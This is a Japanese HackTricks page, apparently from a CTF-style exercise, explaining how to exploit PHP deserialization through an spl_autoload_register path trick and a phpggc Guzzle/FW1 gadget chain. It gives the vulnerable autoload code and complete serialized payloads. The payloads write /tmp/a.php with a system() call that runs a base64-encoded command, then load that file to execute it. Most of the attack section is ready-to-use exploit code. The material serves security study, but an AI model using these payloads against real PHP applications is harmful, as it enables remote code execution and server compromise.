# PHP - デシリアライズ + オートロードクラス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

まず、[**オートロードクラス**](https://www.php.net/manual/en/language.oop5.autoload.php)が何であるかを確認する必要があります。

## PHPデシリアライズ + spl\_autoload\_register + LFI/Gadget

**ウェブアプリ**で**PHPデシリアライズ**を見つけましたが、**`phpggc`**内にガジェットを持つ脆弱なライブラリはありません。ただし、同じコンテナ内には**別のcomposerウェブアプリが脆弱なライブラリを持っています**。したがって、目標は、他のウェブアプリの**コンポーザーローダーを読み込み**、デシリアライズに脆弱なウェブアプリからのガジェットを悪用してそのライブラリを攻撃することです。

手順：

* **デシリアライズ**を見つけましたが、現在のアプリのコードには**ガジェットがありません**
* 次のような**`spl_autoload_register`**関数を悪用して、**`.php`拡張子を持つローカルファイルを読み込む**ことができます
* そのためには、クラスの名前が**`$name`**に含まれるデシリアライズを使用します。シリアル化されたオブジェクトのクラス名には**"/"や"."**を使用することはできませんが、**コード**は**アンダースコア**("\_")を**スラッシュ**("/")に**置き換え**ます。したがって、`tmp_passwd`というクラス名は`/tmp/passwd.php`に変換され、コードはそれを読み込もうとします。\
ガジェットの例は次のとおりです：**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
**ファイルのアップロード**が可能で、**`.php`の拡張子**を持つファイルをアップロードできる場合、この機能を直接悪用してすでにRCEを取得することができます。
{% endhint %}

私の場合、そのようなものはありませんでしたが、**同じコンテナ**内には、**`phpggc`ガジェットに脆弱なライブラリ**が含まれていました。

- この他のライブラリをロードするには、まず**その他のWebアプリケーションのコンポーザーローダーをロードする必要があります**（現在のアプリケーションのものでは他のアプリケーションのライブラリにアクセスできません）。**アプリケーションのパスを知っている**場合、次のコードを使用して簡単に実現できます：**`O:28:"www_frontend_vendor_autoload":0:{}`**（私の場合、コンポーザーローダーは`/www/frontend/vendor/autoload.php`にありました）
- これで、他のアプリケーションのコンポーザーローダーを**ロード**することができるようになりました。次は、**`phpggc`のペイロードを生成**する時です。私の場合、**`Guzzle/FW1`**を使用し、ファイルシステム内に任意のファイルを書き込むことができました。
- 注意：**生成されたガジェットは動作しませんでした**。動作させるためには、phpggcの**`chain.php`**のペイロードを**変更**し、作成されたオブジェクトの属性の**すべてをprivateからpublicに設定**する必要があります。そうしないと、文字列を逆シリアル化した後、作成されたオブジェクトの属性に値がないままになります。
- これで、他のアプリケーションのコンポーザーローダーを**ロード**する方法と、動作する**phpggcペイロード**を持っていますが、ガジェットが使用されるときにローダーがロードされるようにするためには、**同じリクエストでこれを行う必要があります**。そのため、次のようなシリアル化された配列を送信しました：
- **まずローダーがロードされ、次にペイロードが表示されます**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* 今、私たちは**ファイルを作成して書き込む**ことができますが、ユーザーは**ウェブサーバー内のどのフォルダにも書き込むことはできません**。したがって、ペイロードで見るように、**`/tmp/a.php`**に**ベース64**を使用して**`system`**を呼び出します。その後、他のWebアプリのコンポーザーローダーをロードするために使用した最初のタイプのペイロードを再利用して、生成された**`/tmp/a.php`**ファイルをロードします。デシリアライゼーションガジェットに追加するだけです：&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**ペイロードの概要**

* 同じコンテナ内の別のWebアプリの**composer autoloadをロード**する
* phpggcガジェットをロードして、他のWebアプリのライブラリを悪用する（シリアライズの脆弱性のある初期のWebアプリにはガジェットがなかった）
* ガジェットは、悪意のあるコマンドを含むPHPペイロードのファイルを/tmp/a.phpに作成する（Webアプリのユーザーは他のWebアプリの任意のフォルダに書き込むことはできない）
* ペイロードの最後の部分では、コマンドを実行するために生成されたPHPファイルをロードする

このシリアライズを2回呼び出す必要がありました。テストでは、最初の呼び出しでは/tmp/a.phpファイルが作成されましたが、ロードされませんでした。2回目の呼び出しでは正しくロードされました。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
